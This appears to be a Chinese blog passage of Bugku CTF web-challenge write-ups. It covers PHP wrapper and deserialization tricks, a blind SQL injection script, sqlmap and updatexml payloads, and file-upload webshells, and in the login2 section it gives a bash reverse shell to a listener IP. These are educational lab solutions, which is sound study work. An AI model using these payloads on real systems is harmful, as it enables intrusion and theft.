首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE 先直接访问flag文件，直接复制粘贴 构造的网址，返回了flag welcome to bugkuctf打开网址 查看原始界面 F12查看一下源码 很显然想让我们利用源码去得到flag。这里我们稍微解释下这个源码的意思。 开始有三个变量：user，file，pass，但是我们发现这里的pass也就是password没有什么用，因为代码里面虽然定义了这个变量但是并没有使用到。所以我们重点关注前两个变量。看下面的条件 （1）if(isset($user))这个isset()函数是判断$user这个变量的是否存在，user变量不能为空 （2）(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;)) file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。 （3）include($file); // hint.php所以我们要在满足条件之后读取file=hint.php。 知道了以上的三个条件后我们就可以做第一步了，就是如何满足他们的条件！？ 这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到 “php://input”协议。大致的意思是让 txt=php://input ，之后在post过去一个字符串. php伪协议介绍123456789101112131415php:&#x2F;&#x2F;input构造场景：本地web服务器根目录下有文件phpinput_server.php，&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39; echo $raw_post_data; ?&gt; 在浏览器中按照如下方式访问：post框直接输入一段数据excute后，脚本会在页面中输出这段数据。 此种方式可以用来获取post数据，但不能获取get数据。 具体介绍查看：https://www.cnblogs.com/yinqin/articles/4088589.html 当传进去的参数作为文件名变量去打开文件时，可以将参数php://传进，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取 简单来说就是将指定字符串作为文件传给txt，然后再将user的内容读出来。此时我们就满足了 这样就满足了(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))然后我们得到了 此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter 即txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php（简单来说就是利用伪协议读取所包含文件的base64值） 复制base64加密的内容进行解码，得到以下内容 123456789101112131415#hint.php &lt;?php class Flag&#123;&#x2F;&#x2F;flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 之后可以继续利用伪协议读取一下index.php源码 12345678910111213141516171819202122232425262728293031323334#index.php &lt;?php $txt &#x3D; $_GET[&quot;txt&quot;]; $file &#x3D; $_GET[&quot;file&quot;]; $password &#x3D; $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123; echo &quot;不能现在就给你flag哦&quot;; exit(); &#125;else&#123; include($file); $password &#x3D; unserialize($password); echo $password; &#125; &#125;else&#123; echo &quot;you are not the number of bugku ! &quot;; &#125; ?&gt; &lt;!-- $user &#x3D; $_GET[&quot;txt&quot;]; $file &#x3D; $_GET[&quot;file&quot;]; $pass &#x3D; $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); &#x2F;&#x2F;hint.php &#125;else&#123; echo &quot;you are not admin ! &quot;; &#125; --&gt; （1）在hint.php中我们看到了class Flag{//flag.php ，所以我们把index.php改成flag.php看看会有什么结果，发现 居然返回了乱码，看到之前的源码可以知道这是index.php中的echo &quot;不能现在就给你flag哦&quot;;所以不能直接flag.php。 在index我们看到，这个意思是file中如果包含‘flag’，那么就会给你退出。 所以我们要想其他办法读flag.php 我们往下看可以看到 这个else写到如果我的file不包含‘flag’，那么我就会把那个文件包含进来，之后将password反序列化一下。并输出password的结果。 12345else&#123; include($file); $password &#x3D; unserialize($password); echo $password; &#125; 而我们根据上面的hint.php发现， 123456789101112131415#hint.php &lt;?php class Flag&#123;&#x2F;&#x2F;flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。 这不正是我们要解决的输出flag.php内容的情况吗？？？ 所以我们要构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数），即：——根据php序列化的结果 12345678910&lt;?php class Flag&#123; public $file; &#125; $a &#x3D; new Flag(); $a-&gt;file &#x3D; &quot;flag.php&quot;; $a &#x3D; serialize($a); print_r($a); ?&gt; 得到： O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 传入 得到 过狗一句话打开网址 查看原始页面 可以看到题目中给的提示 使用explode函数将poc变量里的#进行截断，然后将分离出来的值放到数组中，得到assert exlpde()分割a#s#s#e#r#t 为 assert 用assert函数来解析传进来的字符，assert有代码执行漏洞。 1234&lt;?php$poc&#x3D;&quot;a#s#s#e#r#t&quot;;$poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;])?&gt; 构造Payload：http://123.206.87.240:8010/?s=print_r(scandir(&#39;./&#39;)) 可以看到里面有f94lag.txt文件，在url中添加改文件 字符？正则？打开页面 查看源页面，可以看到有正则匹配然后构造Payload:keykeykeykeykeykeykeykeykeykey:///keykeykeyx&quot;i 成功返回KEY值 前女友(SKCTF)打开网址 查看原始页面 点击链接这两个字。 发现一段代码 里面有MD5，MD5是不能处理数组的，所以构造Payload：v1[]=1&amp;v2[]=2&amp;v3[]=3，然后返回flag login1(SKCTF)打开网址，可以看到题目提示SQL注入约束攻击 SQL约束攻击：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。 我们尝试了暴力破解等，发现并不能破解出来，我们知道像这种管理后台用户名是admin毋庸置疑，所以利用SQL约束攻击的特性进行攻击，注册用户 更改了Type让其显示输入的密码，点击注册 返回了注册成功，等两秒就会返回登录界面 在登录界面输入刚才注册的用户名和密码，成功返回。 你从哪里来打开网址 返回了 Are you from google？(你是谷歌的吗？) 到这就可以看出，上面是需要我们伪造一下链接Referer Payload：https://www.google.com 你是无法在页面中更改的，所以使用burp抓包，然后发送的Repeater中进行更改运行。 成功返回flag，复制提交就ok md5 collision(NUPT_CTF)打开网址 原始页面，让其输入a，我们输入?a=1查看返会结果 返回false说明错误。这里已经已经看过了burp抓包和F12了，什么都没有。 当我看看题目的时候发现题目是MD5碰撞，我们百度一下什么是MD5碰撞 解释是： PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 原文链接：https://blog.csdn.net/qq_30464257/article/details/81432446 其中常见的MD5碰撞 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172730e开头的md5和原值：QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 以上的MD5碰撞哪一个都行，所以我们只要随便复制一个就可以。复制提交就可以。 程序员本地网站打开网址 显示原始页面 显示从本地访问，这样肯明显就需伪造一下IP，当然想要我在IP的话就需要用burp进行抓包修改运行 将抓取的数据包发送到Repeter模块，在其中加入X-Forwarded-for:127.0.0.1 这样就成功显示flag了，直接复制提交就OK 各种绕过打开网址 查看原始页面 从以上代码分析，可以看到几条有用的信息 1、使 uname的sha1值 与 passwd的sha1的值 相等 2、但是同时 uname 和 passwd两个的值又不能相等 3、id == “margin” 解决办法 1、GTE输入的有uname和id，POST输出的是passwd 2、把 uname 和 passwd定义成数组，数组的哈希值相同 3、id等于margin 在页面中输入，复制提交即可 Web 8打开网址 原始页面，代码审计 题目上显示txt？？？？，尝试访问flag.txt看看 返回了内容flags。对代码进行分析 $ac===$f，结合其他代码说明$f是文件名，$ac是文件内容，只有这样他们才能全等于 这样就在URL中构造payload 还有一种方法。 1、ac不能为空 2、f的值从fn中获取的 3、ac的值要全等于f 构造payload?ac=123&amp;fn=php://input,,,,[PSOT]123 细心打开网址 查看原始页面，可以发现是404页面，显示错误。因为是直接显示错误，抓包什么的没有任何有用的内容 使用御剑扫描一下发现了这两个网站，第2个因为是index.php结尾，就是我们的初始访问的404页面所以无用，那就是第一个了 访问第一个网站，这是初始界面，可以看到给了一个resusl.php的文件，尝试访问一下。 居然进入到了后台，可以看到屏幕中显示你不是管理员你的IP已经被记录到日志了。 卧槽，被记录了，但是在左下角有一串代码，而且题目给的提示是：想办法变成admin，尝试一下?x=admin试试，看看能否访问 发现成功访问了，复制提交即可。 求getshell打开网页 查看原始页面，可以看到，标题让上传图片而不是php，这一看就是文件上传，构造一个文件上传的payload 将其文件名改为png，jpg等图片文件后缀，然后进行上传 上传后返回了图片上传的路径，复制路径到URL中，进行访问，看能否出现空白图片，因为这是伪造的图片所以是空白的不会显示任何内容 将文件放到URL后，返回了空白图片，右键复制图片地址在菜刀或者蚁剑连接。 发现不管是蚁剑还是菜刀都连接不上，不管怎样修改都连接不上，可以猜测图片到后台被删除了 所以我们使用另一种方法，使用burp抓包试试，这里就可以将文件后缀改为php了，抓完包后将Type改为image/jpeg就可以 经过测试php2, php3, php4, php5，phps, pht, phtm, phtml，只有php5才能绕过，这里用了黑名单过滤 请求头部的Content-Type字段，进行大小写绕过，即把multipart/form-data中任意一个字母改成大写即可绕过 INSERT INTO注入打开网页，可以看到题目给的源码 源码 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);function getIp()&#123;$ip &#x3D; &#39;&#39;;if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;else&#123;$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$ip_arr &#x3D; explode(&#39;,&#39;, $ip);return $ip_arr[0];&#125;$host&#x3D;&quot;localhost&quot;;$user&#x3D;&quot;&quot;;$pass&#x3D;&quot;&quot;;$db&#x3D;&quot;&quot;;$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip &#x3D; getIp();echo &#39;your ip is :&#39;.$ip;$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;mysql_query($sql); 明确注入点，是走的http报头的x-forwarded-for。 我尝试了bool型注入，发现自己构造的语句在自己数据库中会报错，但是这里并没有错误报告，因此考虑基于时间的盲注 我之前时间延迟盲注都是用 if(exp1,exp2,epx3) 这种格式来完成的，但是这里的一段代码，相当于把 “,” 给过滤了 12$ip_arr &#x3D; explode(&#39;,&#39;, $ip);return $ip_arr[0]; 于是改变方法，用 case when exp1 then sleep(4) else 1 end 来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 又拼接的语句为value(‘ 输入的内容 ‘)，最后的poc为： 1231&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) #1&#39; and (case when (substr(select database()) from 1 for 1)&#x3D;&#39;c&#39; then sleep(4) else 1 end) # 构造payload 1insert into client_ip (ip) values (&#39; 1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) -- &#39;) Python脚本 123456789101112131415161718192021222324# -*- coding:utf-8 -*-import requestsimport sys# 基于时间的盲注，过滤了逗号 ,sql &#x3D; &quot;127.0.0.1&#39;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)&#x3D;&#39;&#123;1&#125;&#39; then sleep(5) else 0 end))-- +&quot;url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;flag &#x3D; &#39;&#39;for i in range(1, 40): print(&#39;正在猜测：&#39;, str(i)) for ch in range(32, 129): if ch &#x3D;&#x3D; 128: sys.exit(0) sqli &#x3D; sql.format(i, chr(ch)) # print(sqli) header &#x3D; &#123; &#39;X-Forwarded-For&#39;: sqli &#125; try: html &#x3D; requests.get(url, headers&#x3D;header, timeout&#x3D;3) except: flag +&#x3D; chr(ch) print(flag) break 最终得出结果是MD5值，解密就ok 这是一个神奇的登录框打开网址 查看源码 是post提交，url明显提示是个sql注入，由于post提交，要sql和burp结合起来使用。 首先burp抓包，抓到包后选择存到txt文件中：（随便输入账号密码） 我保存到了D盘的1.txt里。 然后打开sqlmap，输入指令：sqlmap.py -r &quot;D:\\1.txt&quot; -p admin_name --dbs 解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点） –dbs意思是想获取数据库名字 可以看到sqlmap获得了数据库的名字： 应该是这个bugkul1，再继续爆表，命令：sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -p admin_name --tables 解释：-D是表示选择了后面的这个数据库 –tables是想获取表 可以看到爆出了表： 应该在flag1这个表里，继续爆列名： 命令：sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns 解释类似上面 不过加了一个-T 指定表 可以发现爆出了列名： flag1这个列 最后查字段 命令：sqlmap.py -r &quot;D:\\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump解释：同上面 –dump是获取字段的命令（在这过程中可能会让你选择Y或者N 我直接回车的）可以看到爆出了flag： 多次打开网址 查看原始页面 可以看到URL有一个 ?id=1，一看到这个第一时间想到的就是注入 测试一下看看是不是 使用万能单引号，发现页面返回错误，说明存在SQL注入。 使用注释符，查看页面返回，发现使用#还是返回错误，说明可能是#这个注释符被过滤了， 使用一下--+或者%23试试，页面返回正常。 查看字段数 发现order by 都已经等于1了还是返回错误， 使用1’ or 1=1 –+ 看看页面返回，发现or被过滤了， 使用双写试试，页面返回正常说明可以双写绕过 因为不知道那些被过滤了，所以测试一下and试试 and也出错了， 将and进行双写，发现页面返回正确 这次知道了or 和 and被过滤了，将or双写查看字段数 当字段为2的时候返回正常，3的时候页面返回错误 查看注入点，嗯？报错了，经过测试发现union select也被过滤了，也要进行双写绕过一下 双写绕过，注入点是2 查看数据库，当前数据库为web1002-1 查看表，不要忘记information中的or双写，可以看到获得的表为flag1和hint 查看flag1表中的内容，获得flag1andaddress这两个字段 查看flag1这个字段，或得内容usOwycTju+FTUUzXosjr，这个数据提交是错误的，所以我们试试address字段 查看address字段内容 可以看到出现了一个下一关的地址，点击。 进去之后发现还有一个注入。 在使用单引号 加注释符 查看字段 字段为2的时候返回正常 查看注入点，把union过滤了，双写，大写小编码等 都不能绕过，因为有报错信息，那就用报错注入 查看数据库 payload：-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 当前数据库为web1002-2 查看表 payload：-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;web1002-2&#39;),0x7e),1) --+ 当前表名： ‘class , flag2‘ 查看flag2表中的字段 payload：-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;flag2&#39;),0x7e),1) --+ 当前字段： ‘flag2 , address‘ 查看flag2字段内容 payload：-1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2)from flag2),0x7e),1) --+ flag{Bugku-sql_6s-2i-4t-bug} 将B改为b因为题目要求小写，如果大写提交的话会提示错误 flag{bugku-sql_6s-2i-4t-bug} 复制提交就ok 文件包含2打开网址 原始页面，什么也没有，查看源码看一下 F12查看源码，可以看到一个upload.php，访问这个文件 可以看到是上传文件的，这里一看加上文件名就知道这里是文件上传漏洞 构造一句话木马，这里不能使用普通的一句话&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;这个payload被过滤了，所以就要构造一个不被过滤的payload payload：&lt;?php &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]) &lt;/script&gt; ?&gt; 复制payload，然后将文件后缀改为例：1.php;.jpg 上传，访问红线处的内容，查看页面是否返回空白，页面只有访问的时候是空白的时候才能使用蚁剑或者菜刀连接成功 复制链接，这里我使用的是蚁剑，使用蚁剑连接 先添加数据，将URL粘贴上，密码就是一句话中POST里面的自己设置的值，测试连接后左下角出现成功就点击添加 双击进入，可以看到这个最长的，他的文件名也非常像flag，双击进去查看 发现flag确实在里面，复制提交就oK 还有一种方法将一句话构造成 &lt;?php &lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;)&lt;/script&gt; ?&gt; 还是将文件名改为1.php;.jpg 提交之后返回路径，复制访问 可以看到this_is_th3_F14g_154f65sd4g35f4d6f43.txt显示出来了，复制进行访问 访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt文件夹 成功返回falg flag.php打开网址 查看原始页面 这里提交数据点击login是没有反应的，开始的时候题目给了提示hint，尝试给hint传参 给hint随机传参，都会返回源码，分析源码 源码 这里的$KEY是没有赋值的，不管最底下的$KEY，因为没有赋值说明当前$KEY为NULL，因为前面有unserialize函数进行反序列化，所以这是反序列化之后的值为NULL，也就是当ISecer全等于$KEY的时候返回flag 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);# cookie等于ISecer$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];# 判断hint不能为空if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__);&#125;# 判断cookie也就是ISecer是否等于$KEY,等于输出flagelseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt; 用在线php测试一下 复制上面的结果，然后因为之前ISecer是cookie的所以要再cookie中进行输入 使用burp抓包发送到repeater模块进行修改，然后运行，成功返回flag 这里不嫩将cookie和上面回车空开一行，否则不出flag 例如： 以为cookie和上面回车空了一行所以断开了，没有执行cookie就结束了 sql注入 2打开网址 原始页面，发现是登录界面，我们使用常用的弱口令试试能否登上，使用burp抓包一下，看看哪个是 抓包后非常绝望，发现除了admin其他都是一样的，我们除了admin挨个尝试一下试试 使用admin123，Wc，居然对了，登录进去了。。。。 可以看到输入框有个ls … 我们照着输入一下试试 输出后居然返回了flag。纯属蒙的 手注 大佬的解题思路：https://blog.csdn.net/Mikasa_/article/details/87475337 还有一个也是瞎猜出来的，就是在URL上输入flag会直接跳转页面，显示flag值 孙XX的博客不会Trim的日记本打开网址 查看原网址 这里注册也没有用，所以用御剑扫一下看看有没有有用的地址 可以看到扫到了一个show.php的地址，双击打开后发现flag就在里面 复制提交就ok Bugku CTF login2(SKCTF)打开网址 查看原始页面 使用burp抓包发送到repeater模块运行， 可以看到有一串base64加密 解密得到以下值 1234$sql&#x3D;&quot;SELECT username,password FROM admin WHERE username&#x3D;&#39;&quot;.$username.&quot;&#39;&quot;;if (!empty($row) &amp;&amp; $row[&#39;password&#39;]&#x3D;&#x3D;&#x3D;md5($password))&#123;&#125; 代码中的单双引号的嵌套，其中username和password列名在数据库中是存字符串的，而字符串是需要用引号引起来的，不然会出错，这个时候最外面的双引号是具有解析变量的作用，而里面的单引号是给数据库语句用的，如果里面再用双引号就会跟最外面的双引号起冲突了，故用单引号。 这告诉我们要登录要满足的条件：查询结果不为空，其次，输入的password的值要等于md5(password)。 例：username=adminadsadaw&#39; union select 1,md5(1)#&amp;password=1 这样就能用后台数据库中并不存在的密码来绕过并登录成功： 下面进入一个命令执行的页面： 采用的反弹shell来做的。 反弹shell需要有公网ip，我们假设有个公网ip192.168.10.130，不用公网ip的话就线下赛局域网做题也行。 输入bash -i &gt;&amp; /dev/tcp/192.168.10.130/8888 0&gt;&amp;1并执行，然后在kali上运行命令：nc -lvp 8888，就能进行连接了，找到flag文件就拿到flag了。原文链接：https://blog.csdn.net/zz_Caleb/java/article/details/89054600 login3(SKCTF)具体步骤在这个网址：https://blog.csdn.net/zpy1998zpy/article/details/80667775 文件上传2（湖湘杯）江湖魔头login4Web进阶phpcmsV9打开页面，从字面意思上就可以看出，这是要进行后台扫描。 可能是我卡的原因，页面显示不全，这并无大碍 使用dirsearch进行目录扫描。 python3 dirsearch -u http://123.206.87.240:8001/ -e php 其中扫描出rebots.txt，其中1.php是返回phpinfo。 在url后打开robots.txt。可以看到flag就在其中 代码审计extract变量覆盖源码 12345678910&lt;?php$flag='xxx';extract($_GET); if(isset($shiyan)) &#123; $content=trim(file_get_contents($flag)); if($shiyan==$content) &#123;echo'flag&#123;xxx&#125;';&#125; else &#123; echo'Oh.no';&#125; &#125;?&gt; 白话代码：一个名叫flag的变量等于‘xxx’将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)如果存在一个名叫shiyan的字符串将flag变量的值赋给名为content变量如果变量shiyan和变量content的值相同，就输出flag的值否则就输出Oh,no因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?shiyan=&amp;flag=也就是利用新传入的值为空的flag替换原有的flag的值。构造空等于空，成功输出flag的值 strcmp比较字符串源码 12345678910&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 可以看到注释，如果两者相等返回0，可以使用数组，来将其判断成0 payload:http://123.206.87.240:9009/6.php?a[]=1 urldecode二次编码绕过源码 12345678910&lt;?phpif(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"not allowed!\");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\")&#123;echo \"Access granted!\"; echo \"flag\";&#125;?&gt; 可以看到题目就已经给提示了，说了两次url编码，复制hackerDJ，在小葵工具，或者在线工具中进行两次URL编码 复制提交以下 payload：http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 MD5()函数123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 可以看到，其中有这样一条判断，进行md5判断，要username和password全等于。所以这里要是用数组绕过，因为md5不能处理数组 1else if (md5($_GET['username']) === md5($_GET['password'])) payload:http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 sha()函数比较绕过源码 1234567891011121314151617181920212223242526&lt;?php$flag = \"flag\";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo \"\";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; 打开页面，先构造一下看看页面返回 如果name和password相同就会返回你的名字不能和密码相同 并且将用户名和密码进行md5加密 将用户名和密码输入不同的数字，就会返回密码无效 审计源码 发现name和password进行sha()函数比较，并且要求全等于，所以就可以利用数组绕过 md5加密相等绕过123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo \"flag&#123;*&#125;\";&#125; else &#123;echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; 打开页面，让其输入a 在url中输入a，审计源码发现，不能直接输入QNKCDZO 输入s878926199a，返回了flag 原理： ​ PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而以下这些字符串，md5哈希之后都是0e开头的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107QNKCDZO0e830400451993494058024219903391s878926199a 0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 十六进制与数字比较123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag = 'flag&#123;test&#125;'; $one = ord('1'); //ord — 返回字符的 ASCII 码值 $nine = ord('9'); //ord — 返回字符的 ASCII 码值 $number = '3735929054';// Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed! return \"flase\"; &#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt;deadc0de 打开页面查看返回，页面返回空白卡 审计代码，数字不能是1~9，这和3735929054冲突，题目也告诉了用十六进制绕过，将3735929054进行转化，转换成十六进制，前面要加上0x，不然它不知道这个是什么。 变量覆盖打不开 ereg正则%00截断12345678910111213141516171819202122232425262728293031&lt;?php$flag = \"xxx\";if (isset ($_GET['password']))&#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 